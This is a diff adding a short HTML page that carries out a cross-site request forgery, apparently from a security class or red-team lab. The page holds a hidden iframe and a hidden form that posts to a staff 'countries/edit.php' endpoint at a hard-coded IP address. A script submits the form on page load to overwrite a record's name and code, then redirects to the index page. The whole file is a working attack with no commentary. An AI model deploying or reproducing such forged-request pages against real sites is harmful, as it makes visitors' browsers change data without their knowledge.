@@ -1,0 +1,9 @@
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='https://35.188.26.223/red/public/staff/countries/edit.php?id=1' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='name' value='William'>
+  <input type='hidden' name='code' value='is the best'>
+  <input type='hidden' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+<script>setTimeout(function(){window.location.href = "https://35.188.26.223/red/public/staff/countries/index.php"}, 1000);</script>
+
